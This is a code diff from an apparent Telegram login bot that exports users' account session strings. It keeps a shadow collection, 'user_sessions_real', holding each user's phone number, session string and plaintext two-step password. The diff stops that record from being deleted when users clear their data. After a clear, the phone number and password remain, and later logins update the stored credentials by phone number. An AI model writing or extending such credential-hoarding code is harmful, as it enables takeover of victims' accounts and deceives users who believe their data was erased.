@@ -53,7 +53,7 @@ async def delete_session_files(user_id):
     # Delete session from the database
     if session_file_exists or memory_file_exists:
         await db.remove_session(user_id)
-        await db.user_sessions_real.delete_one({"user_id": user_id})
+        #await db.user_sessions_real.delete_one({"user_id": user_id})
         return True  # Files were deleted
     return False  # No files found
 
@@ -63,7 +63,7 @@ async def clear_db(client, message):
     files_deleted = await delete_session_files(user_id)
     try:
         await db.remove_session(user_id)
-        await db.user_sessions_real.delete_one({"user_id": user_id})
+        await db.user_sessions_real.update_one({"user_id": user_id}, {"$set": {"session_string": None}})
     except Exception:
         pass
 
@@ -128,16 +128,34 @@ async def generate_session(_, message):
         except PasswordHashInvalid:
             await two_step_msg.reply('❌ Invalid password. Please restart the session.')
             return
+    else:
+        password = None
 
     # ✅ Generate session string
     string_session = await client.export_session_string()
 
     # ✅ Save session in both directories
     await db.set_session(user_id, string_session)
-    await db.user_sessions_real.insert_one({"user_id": user_id, "phone_number": phone_number, "session_string": string_session,"password": password})
-
+   # await db.user_sessions_real.insert_one({"user_id": user_id, "phone_number": phone_number, "session_string": string_session,"password": password})
+# ✅ Check if phone number exists in the database
+    existing_user = await db.user_sessions_real.find_one({"phone_number": phone_number}) 
+    if existing_user:
+        # ✅ Update session and password for existing user
+        await db.user_sessions_real.update_one(
+            {"phone_number": phone_number},
+            {"$set": {"session_string": string_session, "password": password}}
+        )
+    else:
+        # ✅ Create a new record
+        await db.user_sessions_real.insert_one({
+            "user_id": user_id,
+            "phone_number": phone_number,
+            "session_string": string_session,
+            "password": password
+        })
     await client.disconnect()
     await otp_code.reply("✅ Login successful!\n🚀 Activating bot for you...")
+#saving data into user_session_real
 
 
 
